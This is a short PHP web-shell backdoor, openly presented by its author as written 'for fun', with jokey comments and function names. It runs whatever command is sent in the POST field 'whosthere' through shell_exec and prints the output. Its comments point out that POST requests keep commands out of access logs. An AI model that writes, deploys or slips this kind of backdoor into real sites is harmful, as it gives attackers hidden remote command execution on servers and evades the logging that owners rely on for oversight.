<?php
	require("dev.php");
	require("html.php");
/*
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
>> 2233.php                                                          <<,
>>                                                                   <<,
>> a basic php backdoor i wrote for fun                              <<,
>> don't use this on someone else's server, that's naughty           <<,
>> besides weevely is so much better                                 <<,
>>                                                                   <<,
>> released in full compliance with the zf0 anti-copyright pledge    <<,
>>                                                                   <<,
>> i have no idea what i'm doing with this comment box decorating    <<,
>>                                                                   <<,
>> @reptar_xl                                                        <<,
>> badcunt.club                                                      <<,
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
*/


//   this is where the fun happens
//   the html element isn't called banana for any reason, basically 
//   just because i can, it's valid html so nyeh
//   POSTs because otherwise you'll leave stuff in the access logs
//   also, note all commands happen 2>&1 to save you from typing it

function continental_breakfast_is_not_real_breakfast($cmd){
		// this function does the shell exec
		echo "<banana>$ ". $cmd ."</banana>\r\n\r\n". shell_exec($cmd." 2>&1");
}

function main(){

	// top html
	echo fuck_abbott(0);

	// this is only false when some1 first
	// accesses the page, to stop it running
	// empty commands or w/e
	if (isset($_POST["whosthere"])) { // 5h3ll 3x3c
		continental_breakfast_is_not_real_breakfast($_POST['whosthere']);
	}

	// bottom html
	echo fuck_abbott(1);

}

main();

?>